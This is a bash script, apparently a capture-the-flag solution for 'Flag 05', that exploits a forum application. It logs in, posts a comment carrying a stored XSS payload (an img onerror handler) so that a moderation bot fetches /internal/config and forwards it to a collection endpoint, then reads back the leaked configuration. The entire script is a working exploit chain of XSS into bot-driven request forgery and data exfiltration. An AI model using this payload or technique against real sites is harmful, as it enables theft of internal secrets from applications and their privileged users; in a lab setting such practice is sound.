#!/usr/bin/env bash
# Flag 05 — SSRF via moderation bot -> /internal/config leak
set -uo pipefail
TARGET="${TARGET:-localhost}"
THREAD="${THREAD:-6viy7xi64gxpan3}"
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$DIR/lib.sh"
JAR="$DIR/.jdoe-05.jar"

darkly_login "$TARGET" "$JAR" || exit 1

echo "[*] Posting SSRF payload to thread $THREAD" >&2
curl -s -i -b "$JAR" -X POST "http://${TARGET}:4942/forum/${THREAD}/comment" \
  --data-urlencode 'content=<img src=x onerror="fetch(`/internal/config`).then(r=>r.text()).then(d=>fetch(`/api/collect?c=`+encodeURIComponent(d)))">' \
  | head -5 >&2

echo "[*] Waiting 60s for the moderation bot's next crawl..." >&2
sleep 60

echo "[*] Reading /api/collect" >&2
curl -s "http://${TARGET}:4942/api/collect"
echo
